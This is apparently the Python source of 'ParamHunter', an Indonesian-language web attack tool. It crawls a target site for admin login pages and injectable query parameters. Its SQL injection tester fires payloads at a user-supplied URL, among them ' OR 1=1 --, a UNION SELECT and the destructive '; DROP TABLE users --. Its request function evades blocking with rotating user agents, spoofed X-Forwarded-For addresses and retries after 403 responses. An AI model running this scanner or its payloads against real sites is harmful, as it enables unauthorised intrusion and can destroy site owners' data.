_V='/admin_login'
_U='/login'
_T='/controlpanel'
_S='/admin-dashboard'
_R='/adminpanel'
_Q='/admin-login'
_P='/cpanel'
_O='/wp-admin'
_N='/adminarea'
_M='/administrator'
_L='/admin.php'
_K='/admin'
_J='https://'
_I='http://'
_H='?keyword='
_G='?lang='
_F='?product='
_E='?category='
_D='?search='
_C='?page='
_B='?id='
_A=False
import argparse,requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin,urlparse
from random import choice
from collections import deque
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
import re,string,random,time
console=Console()
user_agents=['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36']
extra_headers={'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','Accept-Language':'en-US,en;q=0.9','Connection':'keep-alive','Upgrade-Insecure-Requests':'1'}
def test_sql_injection(url):
	C=["' OR 1=1 --","' UNION SELECT NULL, NULL, NULL --","' AND 1=1 --","' OR 'a'='a","'; DROP TABLE users --"]
	for D in C:
		A=url+D
		try:
			B=requests.get(A)
			if B.status_code==200 and'error'in B.text.lower():console.print(f"[bold red]Potensial SQL Injection ditemukan di: {A}[/bold red]")
			else:console.print(f"[bold green]Aman: {A}[/bold green]")
		except requests.exceptions.RequestException as E:console.print(f"[yellow][ERROR] Gagal akses {A}: {E}[/yellow]")
def sql_scan_menu():
	console.print('[bold blue]Menu SQL Injection Scan[/bold blue]');console.print('[yellow]Masukkan URL yang ingin di-scan untuk SQL injection:[/yellow]');A=input('[bold cyan]URL: [/bold cyan]')
	if not A.startswith((_I,_J)):console.print('[red]URL harus diawali dengan http:// atau https://[/red]');return
	console.print('[bold yellow]Memulai scan SQL Injection...[/bold yellow]');test_sql_injection(A)
def generate_random_parameter(length=10):return''.join(random.choices(string.ascii_letters+string.digits,k=length))
def make_request(url,base_url):
	'Request dengan random User-Agent, retry jika gagal tanpa proxy';A=url
	for E in range(3):
		try:
			C={'User-Agent':random.choice(user_agents),'Referer':base_url,**extra_headers};C['X-Forwarded-For']='.'.join(map(str,(random.randint(0,255)for A in range(4))));B=requests.get(A,timeout=15,headers=C)
			if B.status_code==403:console.log(f"[red][403 Forbidden] Mengakses ulang: {A}");time.sleep(random.randint(5,10));continue
			B.raise_for_status();return B
		except requests.exceptions.RequestException as D:console.log(f"[yellow][ERROR] Gagal akses {A}: {D}");time.sleep(random.randint(5,10))
def has_query_parameter(url):return'?'in url and'='in url
def crawl_website(base_url,filters,random_search=_A,af_search=_A,pr_search=_A):
	J=True;C=filters;B=base_url;H=set();D=deque([B]);E=[]
	if random_search:C.extend([generate_random_parameter()for A in range(3)]);console.print('[bold yellow][INFO] Menggunakan parameter random untuk pencarian.[/bold yellow]')
	if af_search:M=[_K,_L,_M,_N,_O,_P,_Q,_R,_S,_T,_U,_V];C.extend(M);console.print('[bold yellow][INFO] Mencari admin finder dengan filter yang relevan.[/bold yellow]')
	if pr_search:N=[_B,_C,_D,_E,_F,_G,'page?',_H];C.extend(N);console.print('[bold yellow][INFO] Mencari parameter rentan dengan filter: pr.[/bold yellow]')
	while D:
		F=D.popleft()
		if F in H:continue
		console.log(f"[blue][SCAN] Memeriksa: {F}");K=make_request(F,B)
		if not K:continue
		H.add(F);O=BeautifulSoup(K.text,'html.parser');L=[]
		for P in O.find_all('a',href=J):
			A=urljoin(B,P['href']);Q=urlparse(A)
			if Q.netloc==urlparse(B).netloc:
				if A not in H and A not in D:L.append(A)
				for I in C:
					if I and isinstance(I,str):
						try:
							if re.search(f"{re.escape(I)}$",A):
								if A not in E:E.append(A)
								break
						except re.error as R:console.print(f"[bold red][ERROR] Kesalahan regex: {R}[/bold red]");continue
		D.extend(L)
	console.print('\n[bold green][HASIL] URL yang ditemukan By Ren-Xploit:[/bold green]')
	if E:
		G=Table(title='Matching URLs',show_lines=J);G.add_column('No',justify='center',style='cyan',no_wrap=J);G.add_column('URL',justify='left',style='magenta')
		for(S,T)in enumerate(E,1):G.add_row(str(S),T)
		console.print(G)
	else:console.print('[yellow][INFO] Tidak ada URL yang cocok ditemukan.[/yellow]')
def show_help():console.print(Panel.fit('\n[bold yellow]Selamat Datang di tools ParamHunter By RenXploit:[/bold yellow]\n[bold yellow]Cara Penggunaan:[/bold yellow]\npython ParamHunter.py [bold cyan]URL[/bold cyan] -f [bold cyan]FILTER[/bold cyan]\n\n[bold yellow]Contoh Penggunaan normal:[/bold yellow]\npython ParamHunter.py https://example.com -f .php\n\n[bold yellow]Contoh Penggunaan admin finder:[/bold yellow]\npython ParamHunter https://example.com -f -af\n\n[bold yellow]Contoh Penggunaan Parameter Rentan Work 7/10:[/bold yellow]\npython ParamHunter https://example.com -f .php -pr\n\n\n[bold yellow]Jenis Parameter yang Didukung:[/bold yellow]\n- .php\n- .html\n- .asp\n- .jsp\n- .aspx\n- .json\n- .xml\n- .txt\n- .js\n- dan lainnya...\n\n[bold yellow]Fitur Tambahan:[/bold yellow]\n- Random User-Agent\n- Menghindari Forbidden (403)\n- Tampilan hasil dalam tabel\n- Deteksi URL yang valid secara otomatis\n- Pencarian parameter random (seperti dorking) dengan [bold cyan]-random[/bold cyan]\n- Pencarian Admin Finder dengan [bold cyan]-af[/bold cyan]\n- Pencarian Parameter Rentan dengan [bold cyan]-pr[/bold cyan]\n\n[bold yellow]Pilihan Argumen:[/bold yellow]\n-h, --help : Menampilkan panduan interaktif\n-f, --filter : Menentukan filter parameter yang akan dicari\n-random : Mencari parameter secara random (dorking)\n-af : Mencari halaman admin (admin finder)\n-pr : Mencari parameter rentan\n    ',title='[bold blue]ParamHunter - Help[/bold blue]',border_style='bold green'))
def main():
	D='store_true';B=argparse.ArgumentParser(description='Script untuk mencari parameter di website dengan filter yang sangat keren dan valid.');B.add_argument('url',nargs='?',help='URL target (contoh: https://example.com)');B.add_argument('-f','--filter',nargs='*',help='Jenis parameter yang dicari (contoh: .php .html .json)');B.add_argument('-random',action=D,help='Menggunakan filter random otomatis (dorking)');B.add_argument('-af',action=D,help='Mencari halaman admin (admin finder)');B.add_argument('-pr',action=D,help='Mencari parameter rentan');B.add_argument('-sql',action=D,help='Mencari kerentanannya SQL Injection');A=B.parse_args()
	if not A.url or not A.filter and not A.random and not A.af and not A.pr and not A.sql:show_help();return
	if not A.url.startswith((_I,_J)):console.print('[red][ERROR] Masukkan URL yang valid dengan http:// atau https://[/red]');return
	C=A.filter if A.filter else[]
	if A.random:E=[f"/{generate_random_parameter()}.json",f"/{generate_random_parameter()}.jsp",f"/{generate_random_parameter()}.xml",f"/{generate_random_parameter()}.php",f"/{generate_random_parameter()}.txt",f"/{generate_random_parameter()}.html"];C.extend(E);console.print(f"[bold yellow][INFO] Menggunakan filter random otomatis: {', '.join(E)}[/bold yellow]")
	if A.af:F=[_K,_L,_M,_N,_O,_P,_Q,_R,_S,_T,_U,_V];C.extend(F);console.print('[bold yellow][INFO] Menggunakan filter admin finder.[/bold yellow]')
	if A.pr:G=[_B,_C,_D,_E,_F,_G,_H];C.extend(G);console.print('[bold yellow][INFO] Menggunakan filter parameter rentan.[/bold yellow]')
	if A.sql:H=[_B,_C,_D,_E,_F,_G,_H];C.extend(H);console.print('[bold yellow][INFO] Menggunakan filter untuk mencari kerentanannya SQL Injection.[/bold yellow]')
	console.print(f"[bold green][INFO] Memulai crawling untuk: {A.url}[/bold green]");crawl_website(A.url,C,random_search=A.random,af_search=A.af,pr_search=A.pr)
if __name__=='__main__':main()
